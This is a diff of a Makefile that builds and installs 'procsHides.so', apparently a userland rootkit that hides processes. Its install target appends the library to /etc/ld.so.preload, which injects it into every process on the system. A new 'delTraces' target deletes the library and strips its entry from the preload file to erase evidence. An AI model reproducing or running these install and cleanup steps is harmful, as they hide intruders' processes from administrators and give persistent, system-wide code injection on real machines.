@@ -4,6 +4,7 @@
 # Name of file
 NAME		=	procsHides.so
 PATH_INSTALL=	/usr/local/lib/
+PATH_PRELOAD=	/etc/ld.so.preload
 
 # Name directory
 PATH_SRC	=	srcs
@@ -16,9 +17,9 @@ OBJS		=	$(addprefix $(PATH_OBJ)/, $(notdir $(SRCS:.c=.o)))
 LOG			=	$(PATH_LOG)/$(NAME).log
 
 COMP		=	gcc
-COMP_FLAG	=	-Wall -Werror -Wextra
+COMP_FLAG	=	-Wall -Werror -Wextra 
 COMP_HIDE	=	-fPIC -shared
-COMP_LKN	=	-ldl
+COMP_LNK	=	-ldl
 # Others Command
 RM			=	/bin/rm
 
@@ -36,23 +37,33 @@ all:	init $(NAME) install
 init:
 	@ $(shell mkdir -p $(PATH_LOG) $(PATH_OBJ))
 
+
+debug:	COMP_DEBUG = -D DEBUG=1
+debug:	init $(NAME) install
+	@ echo "$(_SUCCESS) Debug compilation done"
+
 install:
-	@ mv $(NAME) $(PATH_INSTALL)
-	@ echo /usr/local/lib/procsHides.so >> /etc/ld.so.preload
+	@ cp -f $(NAME) $(PATH_INSTALL)
+	@ echo $(PATH_INSTALL)$(NAME) >> $(PATH_PRELOAD)
 	@ echo "$(_SUCCESS) Installation done"
 	
 $(NAME): $(OBJS)
-	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_HIDE) -o $(NAME) $(OBJS) $(COMP_LKN) ) >> $(LOG) 2>&1
+	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_HIDE) $(COMP_DEBUG) -o $(NAME) $(OBJS) $(COMP_LNK) ) >> $(LOG) 2>&1
 
 $(PATH_OBJ)/%.o : $(PATH_SRC)/%.c
-	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_HIDE) -c $< -o $@) >> $(LOG) 2>&1
+	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_DEBUG) $(COMP_HIDE) -c $< -o $@) >> $(LOG) 2>&1
 	@ echo "$(_INFO) Compilation of $*"
+
+delTraces:
+	@ $(RM) -rf $(PATH_INSTALL)/$(NAME)
+	@ sed -i '\_$(PATH_INSTALL)$(NAME)_d' $(PATH_PRELOAD)
+	@ echo "$(_INFO) Traces erased"
 
 clean:
 	@ $(RM) -rf $(PATH_OBJ)
-	@ echo "$(_INFO) Deleted files and directory"
+	@ echo "$(_INFO) Files and directory deleted"
 
-fclean: clean
+fclean: clean	delTraces
 	@ $(RM) -rf $(NAME)
 	@ $(RM) -rf $(PATH_LOG)
 
